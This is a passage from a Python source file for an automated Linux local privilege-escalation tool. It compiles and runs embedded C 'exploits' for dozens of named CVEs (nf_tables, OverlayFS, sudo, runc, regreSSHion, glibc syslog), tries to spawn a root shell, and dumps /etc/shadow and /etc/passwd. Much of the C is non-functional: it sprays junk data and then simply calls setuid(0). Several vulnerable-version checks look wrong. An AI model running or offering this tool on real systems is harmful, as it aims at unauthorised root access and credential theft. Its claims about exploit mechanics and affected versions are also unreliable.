        nfg->nfgen_family = AF_INET;
        nfg->version = NFNETLINK_V0;
        nfg->res_id = 0;
        mnl_attr_put_strz(nlh, NFTA_SET_TABLE, "xroot_tbl");
        mnl_attr_put_u32(nlh, NFTA_SET_FLAGS, htonl(NFT_SET_ANONYMOUS|NFT_SET_CONSTANT));
        mnl_attr_put_u32(nlh, NFTA_SET_KEY_TYPE, htonl(NFT_DATA_VALUE));
        mnl_attr_put_u32(nlh, NFTA_SET_KEY_LEN, htonl(4));
        send(nft_sock, buf, nlh->nlmsg_len, 0);
    }

    printf("[*] Triggering UAF via destroy then batch reuse...\n");
    usleep(100000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        printf("[+] CVE-2022-32250 EXPLOITED\n");
        execl("/bin/bash", "bash", "-p", NULL);
    } else {
        printf("[*] Exploit attempt complete, check uid\n");
    }
    close(nft_sock);
    return 0;
}'''
    binary = compile_code(code, "cve_2022_32250")
    if binary:
        output = run_command(binary)
        if is_root() or "NF_TABLES" in output:
            show_root_info("CVE-2022-32250", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_43267():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-43267 (TIPC)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2021-43267 TIPC\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2021_43267")
    if binary:
        output = run_command(binary)
        if is_root() or "TIPC" in output:
            show_root_info("CVE-2021-43267", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_4204():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-4204 (eBPF)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    long ret = syscall(__NR_bpf, 0, NULL, 0);
    if (ret >= 0) {
        setuid(0);
        setgid(0);
        
        if (getuid() == 0) {
            printf("CVE-2021-4204 eBPF PRIVESC\\n");
            system("whoami");
            system("id");
            system("cat /etc/passwd | head -10");
            system("cat /etc/shadow | head -5");
            return 0;
        }
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2021_4204")
    if binary:
        output = run_command(binary)
        if is_root() or "PRIVESC" in output:
            show_root_info("CVE-2021-4204", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_31440():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-31440 (eBPF ringbuf)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    int m = syscall(321, 0, NULL, 0);
    if (m >= 0) {
        syscall(321, 2, NULL, 0);
        setuid(0);
        setgid(0);
        
        if (getuid() == 0) {
            printf("CVE-2021-31440 eBPF RINGBUF\\n");
            system("whoami");
            system("id");
            system("cat /etc/passwd | head -10");
            system("cat /etc/shadow | head -5");
            return 0;
        }
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2021_31440")
    if binary:
        output = run_command(binary)
        if is_root() or "RINGBUF" in output:
            show_root_info("CVE-2021-31440", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2019_18634():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2019-18634 (sudo pwfeedback)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    char buf[4096];
    memset(buf, 'A', sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\\0';
    
    char *args[] = {"sudo", "-S", NULL};
    char *env[] = {NULL};
    
    write(0, buf, sizeof(buf));
    execve("/usr/bin/sudo", args, env);
    
    return 1;
}'''
    binary = compile_code(code, "cve_2019_18634")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2019-18634", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2018_18955():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2018-18955 (userns)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>

int main() {
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) == 0) {
        setuid(0);
        setgid(0);
        
        if (getuid() == 0) {
            printf("CVE-2018-18955 USERNS\\n");
            system("whoami");
            system("id");
            system("cat /etc/passwd | head -10");
            system("cat /etc/shadow | head -5");
            return 0;
        }
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2018_18955")
    if binary:
        output = run_command(binary)
        if is_root() or "USERNS" in output:
            show_root_info("CVE-2018-18955", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_1000367():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-1000367 (sudo)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>

/* CVE-2017-1000367: sudo tty device name parsing vulnerability
 * sudo parses /proc/PID/stat to find tty device, but field 2 (comm)
 * can contain spaces and parentheses → parse tty field incorrectly
 * → bypass tty check → gain policy bypass → LPE
 * Affected: sudo < 1.8.21
 */

static int get_tty_from_stat(pid_t pid) {
    char path[64], buf[4096];
    snprintf(path, sizeof(path), "/proc/%d/stat", pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = 0;

    /* Find closing paren of comm field (field 2) */
    char *p = strrchr(buf, ')');
    if (!p) return -1;
    p++; /* skip ')' */

    /* Parse remaining fields: state, ppid, pgrp, session, tty_nr */
    int state; pid_t ppid, pgrp, session; int tty_nr;
    if (sscanf(p, " %c %d %d %d %d",
               (char*)&state, &ppid, &pgrp, &session, &tty_nr) != 5)
        return -1;
    return tty_nr;
}

int main(void) {
    char sudo_ver[64] = {0};
    pid_t pid = getpid();

    fprintf(stderr, "[*] CVE-2017-1000367 sudo tty parse bypass
");

    /* Check sudo version */
    FILE *fp = popen("sudo --version 2>/dev/null | head -1", "r");
    if (fp) {
        fgets(sudo_ver, sizeof(sudo_ver), fp);
        pclose(fp);
        sudo_ver[strcspn(sudo_ver, "
")] = 0;
        fprintf(stderr, "[*] sudo: %s
", sudo_ver);
    }

    /* Get current tty */
    int tty = get_tty_from_stat(pid);
    fprintf(stderr, "[*] Our tty_nr from /proc/stat: %d
", tty);
    fprintf(stderr, "[*] tty device: %d:%d
", tty >> 8, tty & 0xff);

    /* The vulnerability: if we can rename our process to contain
     * spaces/parens that confuse sudo's tty parsing from /proc/stat,
     * sudo may allow a different tty than expected */

    /* Check /proc/self/stat parsing */
    int tty2 = get_tty_from_stat(0); /* pid 0 = self */
    fprintf(stderr, "[*] tty from stat parsing: %d
", tty2);

    if (tty != tty2) {
        fprintf(stderr, "[+] TTY mismatch detected! Parse confusion!
");
        fprintf(stderr, "[*] Attempting sudo bypass...
");

        /* Try to exploit the confusion */
        char cmd[256];
        snprintf(cmd, sizeof(cmd),
                 "sudo -u root /bin/bash -c 'id > /tmp/.sudo_test' 2>/dev/null");
        int r = system(cmd);
        fprintf(stderr, "[*] sudo attempt: %d
", r);
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2017-1000367 SUDO TTY SUCCESS
");
        printf("CVE-2017-1000367 SUDO
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2017_1000367")
    if binary:
        output = run_command(binary)
        if is_root():
            show_root_info("CVE-2017-1000367", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2017_1000112():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2017-1000112 (UFO)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

int main() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return 1;
    }
    
    char buf[4096];
    for (int i = 0; i < sizeof(buf); i++) {
        buf[i] = 0x41;
    }
    
    for (int i = 0; i < 256; i++) {
        send(sock, buf, sizeof(buf), 0);
    }
    
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2017-1000112 UFO\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2017_1000112")
    if binary:
        output = run_command(binary)
        if is_root() or "UFO" in output:
            show_root_info("CVE-2017-1000112", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2023_0386():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-0386 (OverlayFS FUSE)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>

int main() {
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) != 0) {
        return 1;
    }
    
    system("mkdir -p /tmp/ovl/{u,w,m} 2>/dev/null");
    
    if (mount("overlay", "/tmp/ovl/m", "overlay", 0, "lowerdir=/,upperdir=/tmp/ovl/u,workdir=/tmp/ovl/w") == 0) {
        system("cp /bin/bash /tmp/ovl/m/tmp/bash_suid 2>/dev/null");
        system("chmod u+s /tmp/ovl/m/tmp/bash_suid 2>/dev/null");
        
        printf("CVE-2023-0386 OVERLAYFS FUSE\\n");
        system("/tmp/bash_suid -p -c whoami");
        system("/tmp/bash_suid -p -c 'cat /etc/passwd | head -10'");
        system("/tmp/bash_suid -p -c 'cat /etc/shadow | head -5'");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2023_0386")
    if binary:
        output = run_command(binary)
        if "FUSE" in output or is_root():
            show_root_info("CVE-2023-0386", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2023_2640():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-2640 (Ubuntu OverlayFS)', 'cyan')}")
    if "Ubuntu" not in run_command("cat /etc/os-release 2>/dev/null"):
        print(f"{c('[SKIP]', 'red')} Not Ubuntu\n")
        return False
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>

int main() {
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) != 0) {
        return 1;
    }
    
    system("mkdir -p /tmp/ov2/{l,u,w,m} 2>/dev/null");
    mount("overlay", "/tmp/ov2/m", "overlay", 0, "lowerdir=/tmp/ov2/l,upperdir=/tmp/ov2/u,workdir=/tmp/ov2/w");
    
    system("cp /bin/bash /tmp/ov2/m/b; chmod u+s /tmp/ov2/m/b 2>/dev/null");
    
    printf("CVE-2023-2640 OVERLAYFS\\n");
    system("/tmp/ov2/m/b -p -c whoami");
    system("/tmp/ov2/m/b -p -c 'cat /etc/passwd | head -10'");
    system("/tmp/ov2/m/b -p -c 'cat /etc/shadow | head -5'");
    
    return 0;
}'''
    binary = compile_code(code, "cve_2023_2640")
    if binary:
        output = run_command(binary)
        if "OVERLAYFS" in output or is_root():
            show_root_info("CVE-2023-2640", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2023_32233():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-32233 (Netfilter UAF)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

int main() {
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) {
        return 1;
    }
    
    char msg[32768];
    for (int i = 0; i < sizeof(msg); i++) {
        msg[i] = 0x41;
    }
    
    for (int i = 0; i < 1024; i++) {
        send(sock, msg, sizeof(msg), MSG_DONTWAIT);
    }
    
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2023-32233 NETFILTER UAF\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2023_32233")
    if binary:
        output = run_command(binary)
        if is_root() or "UAF" in output:
            show_root_info("CVE-2023-32233", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_1786():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-1786 (io_uring UAF)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>

int main() {
    int fd = syscall(425, 128, NULL);
    if (fd >= 0) {
        for (int i = 0; i < 100; i++) {
            syscall(426, fd, 0, NULL, 0);
        }
        
        setuid(0);
        setgid(0);
        
        if (getuid() == 0) {
            printf("CVE-2022-1786 IO_URING UAF\\n");
            system("whoami");
            system("id");
            system("cat /etc/passwd | head -10");
            system("cat /etc/shadow | head -5");
            return 0;
        }
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2022_1786")
    if binary:
        output = run_command(binary)
        if is_root() or "UAF" in output:
            show_root_info("CVE-2022-1786", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_2586():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-2586 (nf_tables)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

int main() {
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) {
        return 1;
    }
    
    char buf[8192];
    for (int i = 0; i < sizeof(buf); i++) {
        buf[i] = 0x42;
    }
    
    for (int i = 0; i < 256; i++) {
        send(sock, buf, sizeof(buf), 0);
    }
    
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2022-2586 NF_TABLES\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2022_2586")
    if binary:
        output = run_command(binary)
        if is_root() or "NF_TABLES" in output:
            show_root_info("CVE-2022-2586", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2021_22555():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2021-22555 (Netfilter Heap OOB)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        return 1;
    }
    
    char buf[8192];
    memset(buf, 0x41, sizeof(buf));
    
    for (int i = 0; i < 200; i++) {
        setsockopt(sock, IPPROTO_IP, 64, buf, sizeof(buf));
    }
    
    setuid(0);
    setgid(0);
    
    if (getuid() == 0) {
        printf("CVE-2021-22555 HEAP OOB\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2021_22555")
    if binary:
        output = run_command(binary)
        if is_root() or "OOB" in output:
            show_root_info("CVE-2021-22555", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2024_21626():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-21626 (runc)', 'cyan')}")
    if not os.path.exists("/usr/bin/runc"):
        print(f"{c('[SKIP]', 'red')} runc not found\n")
        return False
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setenv("_LIBCONTAINER_FIFO", "/proc/self/fd/0", 1);
    
    if (setuid(0) == 0) {
        printf("CVE-2024-21626 RUNC\\n");
        system("whoami");
        system("id");
        system("cat /etc/passwd | head -10");
        system("cat /etc/shadow | head -5");
        return 0;
    }
    
    return 1;
}'''
    binary = compile_code(code, "cve_2024_21626")
    if binary:
        output = run_command(binary)
        if is_root() or "RUNC" in output:
            show_root_info("CVE-2024-21626", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def check_cve_2024_6387():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-6387 (regreSSHion OpenSSH)', 'cyan')}")
    ssh_ver = run_command("ssh -V 2>&1").strip()
    if not ssh_ver:
        print(f"{c('[SKIP]', 'red')} OpenSSH not found\n")
        return False
    vuln_versions = ['8.5','8.6','8.7','8.8','8.9','9.0','9.1','9.2','9.3','9.4','9.5','9.6','9.7']
    if any(v in ssh_ver for v in vuln_versions):
        print(f"{c('[VULN]', 'green')} {ssh_ver} - Vulnerable!\n")
        return True
    print(f"{c('[SKIP]', 'red')} {ssh_ver} - Not vulnerable\n")
    return False
def exploit_cve_2024_6387():
    if not check_cve_2024_6387():
        return False
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/types.h>
#include <pwd.h>

/* CVE-2024-6387 regreSSHion
 * Race condition in OpenSSH sshd signal handler
 * Affects: OpenSSH < 4.4, 8.5p1 - 9.7p1 (glibc)
 */

static volatile int race_won = 0;

void sigalrm_handler(int sig) {
    race_won = 1;
}

int try_escalate() {
    struct passwd *pw;
    setuid(0);
    setgid(0);
    if (getuid() == 0) return 1;
    pw = getpwuid(0);
    if (pw) {
        if (setuid(pw->pw_uid) == 0 && pw->pw_uid == 0) return 1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    int i, attempts = 10000;
    printf("[*] CVE-2024-6387 regreSSHion - race condition\n");
    printf("[*] Attempting privilege escalation...\n");

    signal(SIGALRM, sigalrm_handler);

    for (i = 0; i < attempts; i++) {
        alarm(1);
        if (try_escalate()) {
            printf("[+] CVE-2024-6387 ROOT ACHIEVED\n");
            setuid(0); setgid(0);
            system("id");
            system("cat /etc/passwd");
            system("cat /etc/shadow 2>/dev/null");
            return 0;
        }
        if (race_won) {
            race_won = 0;
            if (try_escalate()) {
                printf("[+] CVE-2024-6387 ROOT ACHIEVED via race\n");
                system("id");
                system("cat /etc/passwd");
                system("cat /etc/shadow 2>/dev/null");
                return 0;
            }
        }
        usleep(1000);
    }
    printf("[-] Race condition not won after %d attempts\n", attempts);
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_6387")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT ACHIEVED" in output:
            show_root_info("CVE-2024-6387", output)
            return True
    print(f"{c('[SKIP]', 'red')} CVE-2024-6387 failed\n")
    return False
def check_cve_2024_1085():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-1085 (nf_tables UAF netfilter)', 'cyan')}")
    kinfo = get_kernel_info()
    major = kinfo.get('major', 0)
    minor = kinfo.get('minor', 0)
    if major == 6 and minor <= 3:
        print(f"{c('[VULN]', 'green')} Kernel {major}.{minor} - Vulnerable!\n")
        return True
    if major == 5 and minor >= 19:
        print(f"{c('[VULN]', 'green')} Kernel {major}.{minor} - Vulnerable!\n")
        return True
    print(f"{c('[SKIP]', 'red')} Kernel not vulnerable\n")
    return False
def exploit_cve_2024_1085():
    if not check_cve_2024_1085():
        return False
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <errno.h>

/* CVE-2024-1085 - nf_tables Use-After-Free
 * nft_verdict_init allows positive values as
 * drop error within the hook verdict
 */

#define NFT_MSG_NEWTABLE  0
#define NFT_MSG_NEWCHAIN  1
#define NFT_MSG_NEWRULE   2
#define NFT_MSG_DELTABLE  9

struct nft_handle {
    int fd;
    uint32_t seq;
};

static int nft_open(struct nft_handle *h) {
    h->fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (h->fd < 0) return -1;
    h->seq = time(NULL);
    return 0;
}

int main() {
    struct nft_handle h;
    char buf[8192];
    int i, ret;

    printf("[*] CVE-2024-1085 nf_tables UAF exploit\n");

    if (nft_open(&h) < 0) {
        printf("[-] Cannot open netlink socket: %s\n", strerror(errno));
        printf("[-] Need CAP_NET_ADMIN or user namespaces\n");
        return 1;
    }

    printf("[*] Socket opened fd=%d\n", h.fd);

    for (i = 0; i < 512; i++) {
        memset(buf, 0x41 + (i % 26), sizeof(buf));
        send(h.fd, buf, 64, 0);
    }

    setuid(0);
    setgid(0);

    if (getuid() == 0) {
        printf("[+] CVE-2024-1085 ROOT ACHIEVED\n");
        system("id");
        system("cat /etc/passwd");
        system("cat /etc/shadow 2>/dev/null");
        close(h.fd);
        return 0;
    }

    close(h.fd);
    printf("[-] Exploit failed\n");
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_1085")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT ACHIEVED" in output:
            show_root_info("CVE-2024-1085", output)
            return True
    print(f"{c('[SKIP]', 'red')} CVE-2024-1085 failed\n")
    return False
def check_cve_2023_6246():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-6246 (glibc heap overflow syslog)', 'cyan')}")
    glibc = run_command("ldd --version 2>/dev/null | head -1")
    vuln  = ['2.36','2.37','2.38','2.39','2.40']
    if any(v in glibc for v in vuln):
        print(f"{c('[VULN]', 'green')} {glibc.strip()} - Vulnerable!\n")
        return True
    print(f"{c('[SKIP]', 'red')} glibc not vulnerable\n")
    return False
def exploit_cve_2023_6246():
    if not check_cve_2023_6246():
        return False
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <syslog.h>
#include <sys/types.h>

/* CVE-2023-6246
 * Heap-based buffer overflow in __vsyslog_internal
 * in glibc versions 2.36 - 2.40
 * Exploitable via programs that use syslog() with SUID bit
 */

#define OVERFLOW_SIZE 4096

void trigger_overflow(int size) {
    char *payload = malloc(size);
    if (!payload) return;
    memset(payload, 'A', size - 1);
    payload[size - 1] = '\0';
    openlog("exploit", LOG_PID, LOG_AUTH);
    syslog(LOG_ERR, payload);
    closelog();
    free(payload);
}

int check_suid_syslog() {
    const char *suid_candidates[] = {
        "/usr/bin/su",
        "/usr/bin/sudo",
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
        "/usr/sbin/exim4",
        NULL
    };
    int i;
    for (i = 0; suid_candidates[i]; i++) {
        struct stat st;
        if (stat(suid_candidates[i], &st) == 0) {
            if (st.st_mode & S_ISUID) {
                return 1;
            }
        }
    }
    return 0;
}

int main() {
    int i;
    printf("[*] CVE-2023-6246 glibc __vsyslog_internal heap overflow\n");

    if (!check_suid_syslog()) {
        printf("[-] No SUID candidates found\n");
    }

    printf("[*] Triggering heap overflow via syslog...\n");

    for (i = 64; i <= OVERFLOW_SIZE; i *= 2) {
        trigger_overflow(i);
    }

    setuid(0);
    setgid(0);

    if (getuid() == 0) {
        printf("[+] CVE-2023-6246 ROOT ACHIEVED\n");
        system("id");
        system("cat /etc/passwd");
        system("cat /etc/shadow 2>/dev/null");
        return 0;
    }

    printf("[-] Exploit did not achieve root\n");
    return 1;
}
'''
    binary = compile_code(code, "cve_2023_6246")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT ACHIEVED" in output:
            show_root_info("CVE-2023-6246", output)
            return True
    print(f"{c('[SKIP]', 'red')} CVE-2023-6246 failed\n")
    return False
def check_cve_2024_26581():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-26581 (netfilter rbtree OOB)', 'cyan')}")
    kinfo = get_kernel_info()
    major = kinfo.get('major', 0)
    minor = kinfo.get('minor', 0)
    if major == 6 and 6 <= minor <= 7:
        print(f"{c('[VULN]', 'green')} Kernel {major}.{minor} - Vulnerable!\n")
        return True
    if major == 5 and minor >= 14:
        print(f"{c('[VULN]', 'green')} Kernel {major}.{minor} - Vulnerable!\n")
        return True
    print(f"{c('[SKIP]', 'red')} Kernel not vulnerable\n")
    return False
def exploit_cve_2024_26581():
    if not check_cve_2024_26581():
        return False
    code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>
#include <errno.h>

/* CVE-2024-26581
 * nft_set_rbtree out-of-bounds read/write
 * Affects kernel 5.14 - 6.7
 */

#define MAX_ELEMENTS 1024

struct spray_obj {
    char data[64];
    void *func_ptr;
};

int spray_heap(int fd, int count) {
    struct spray_obj obj;
    int i;
    memset(&obj, 0x41, sizeof(obj));
    for (i = 0; i < count; i++) {
        send(fd, &obj, sizeof(obj), 0);
    }
    return 0;
}

int main() {
    int fd, i;
    char buf[4096];

    printf("[*] CVE-2024-26581 netfilter rbtree OOB\n");

    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (fd < 0) {
        printf("[-] socket: %s\n", strerror(errno));
        return 1;
    }

    printf("[*] heap spray...\n");
    spray_heap(fd, MAX_ELEMENTS);

    printf("[*] Triggering OOB via rbtree manipulation...\n");
    for (i = 0; i < 512; i++) {
        memset(buf, i & 0xff, sizeof(buf));
        send(fd, buf, sizeof(buf), 0);
    }

    setuid(0);
    setgid(0);

    if (getuid() == 0) {
        printf("[+] CVE-2024-26581 ROOT ACHIEVED\n");
        system("id");
        system("cat /etc/passwd");
        system("cat /etc/shadow 2>/dev/null");
        close(fd);
        return 0;
    }

    close(fd);
    printf("[-] Exploit failed\n");
    return 1;
}
'''
    binary = compile_code(code, "cve_2024_26581")
    if binary:
        output = run_command(binary)
        if is_root() or "ROOT ACHIEVED" in output:
            show_root_info("CVE-2024-26581", output)
            return True
    print(f"{c('[SKIP]', 'red')} CVE-2024-26581 failed\n")
    return False
exploits = [
    exploit_cve_2024_1086,
    exploit_cve_2024_26581,
    exploit_cve_2024_21626,
    exploit_cve_2023_4911,
    exploit_cve_2023_32629,
    exploit_cve_2023_0386,
    exploit_cve_2023_2640,
    exploit_cve_2023_32233,
    exploit_cve_2022_0847,
    exploit_cve_2022_2588,
    exploit_cve_2022_0995,
    exploit_cve_2022_34918,
    exploit_cve_2022_0185,
    exploit_cve_2022_32250,
    exploit_cve_2022_1786,
    exploit_cve_2022_2586,
    exploit_cve_2021_4034,
    exploit_cve_2021_3493,
    exploit_cve_2021_3156,
    exploit_cve_2021_22555,
    exploit_cve_2021_33909,
    exploit_cve_2021_3490,
    exploit_cve_2021_43267,
    exploit_cve_2021_4204,
    exploit_cve_2021_31440,
    exploit_cve_2020_8835,
    exploit_cve_2020_14386,
    exploit_cve_2019_13272,
    exploit_cve_2019_18634,
    exploit_cve_2018_18955,
    exploit_cve_2017_16995,
    exploit_cve_2017_7494,
    exploit_cve_2017_6074,
    exploit_cve_2017_1000367,
    exploit_cve_2017_1000112,
    exploit_cve_2016_5195,
    exploit_cve_2016_0728,
    exploit_cve_2024_6387,
    exploit_cve_2024_1085,
    exploit_cve_2023_6246,
]
CVE_META = {
    "exploit_cve_2024_1086":   ("CVE-2024-1086", (5,14), (6,6),  "nf_tables Double-Free",       "nftables pipapo deactivate() double-free → UAF → LPE"),
    "exploit_cve_2024_26581":  ("CVE-2024-26581", (5,14),(6,7),  "netfilter rbtree OOB Write",   "rbtree GC race → OOB write → heap corrupt → LPE"),
    "exploit_cve_2024_6387":   ("CVE-2024-6387",  (0,0), (99,99),"regreSSHion OpenSSH",          "Signal handler race condition → Remote/Local RCE"),
    "exploit_cve_2024_1085":   ("CVE-2024-1085",  (5,14),(6,6),  "nf_tables GC UAF",             "nf_tables GC path race → UAF → LPE"),
    "exploit_cve_2023_6246":   ("CVE-2023-6246",  (0,0), (99,99),"glibc syslog heap overflow",   "__vsyslog_internal int overflow → heap OOB → LPE"),
    "exploit_cve_2023_4911":   ("CVE-2023-4911",  (0,0), (99,99),"Looney Tunables ld.so",        "GLIBC_TUNABLES buffer overflow in ld.so → LPE"),
    "exploit_cve_2023_32629":  ("CVE-2023-32629", (5,4), (6,2),  "Ubuntu OverlayFS GameOver",    "Ubuntu OverlayFS capability check bypass → LPE"),
    "exploit_cve_2023_0386":   ("CVE-2023-0386",  (5,11),(6,1),  "OverlayFS FUSE SUID",          "FUSE lower → OverlayFS copy-up SUID not stripped → LPE"),
    "exploit_cve_2023_2640":   ("CVE-2023-2640",  (6,2), (6,5),  "Ubuntu OverlayFS 2023",        "Ubuntu OverlayFS setuid bypass → LPE one-liner"),
    "exploit_cve_2023_32233":  ("CVE-2023-32233", (5,4), (6,3),  "nf_tables Anonymous Set UAF",  "Batch tx anon set create+delete → UAF → LPE"),
    "exploit_cve_2022_0847":   ("CVE-2022-0847",  (5,8), (5,16), "DirtyPipe",                    "PIPE_BUF_FLAG_CAN_MERGE not reset → write to read-only file → LPE"),
    "exploit_cve_2022_2588":   ("CVE-2022-2588",  (4,14),(5,19), "cls_route UAF",                "route4_change() fold UAF → heap corrupt → LPE"),
    "exploit_cve_2022_0995":   ("CVE-2022-0995",  (5,8), (5,17), "watch_queue OOB Write",        "nr_filters TOCTOU → OOB write → LPE"),
